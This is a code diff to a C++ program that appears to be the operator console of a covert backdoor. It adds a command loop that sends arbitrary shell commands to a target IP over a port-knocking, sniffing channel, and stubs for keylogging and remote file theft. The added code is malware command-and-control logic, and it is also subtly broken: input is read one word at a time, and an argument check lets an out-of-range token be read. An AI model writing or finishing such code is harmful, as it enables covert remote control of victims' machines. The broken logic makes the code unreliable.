@@ -195,7 +195,11 @@ int clientMode(const Properties &p) {
  *      The exit code for the application.
  */
 int serverMode(const Properties &p) {
+    bool running;
     std::string line;
+    std::vector<std::string> tokens;
+
+    struct in_addr daddr;
 
     const std::string &interface = p.at("interface");
     const std::string &key = p.at("key");
@@ -207,15 +211,43 @@ int serverMode(const Properties &p) {
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
     netEngine.startAsyncSniff("ip");
 
-    while (true) {
+    running = true;
+    while (running) {
         std::cout << "server: ";
-        std::getline(std::cin, line);
+        std::cin >> line;
 
-        if (line == "quit") {
-            break;
+        tokens = tokenizeString(line);
+
+        // format: quit
+        if (tokens[0] == "quit") {
+            running = false;
         }
 
-        // implement some sort of command logic here
+        // format: exec [ip] [command]
+        if (tokens[0] == "exec") {
+            // check argument count
+            if (tokens.size() < 2) {
+                std::cerr << "server: Not enough arguments" << std::endl;
+                break;
+            }
+
+            // convert and check ip
+            if (!inet_aton(tokens[1].c_str(), &daddr)) {
+                std::cerr << "server: Invalid destination host" << std::endl;
+                break;
+            }
+
+            // run command
+            RemoteCodeExecuter::sendCommand(&netEngine, daddr, line.substr(line.find(tokens[2])));
+        }
+
+        // format: keylog [ip]
+        if (tokens[0] == "keylog") {
+        }
+
+        // format: get [ip] [file]
+        if (tokens[0] == "get") {
+        }
     }
 
     return 0;
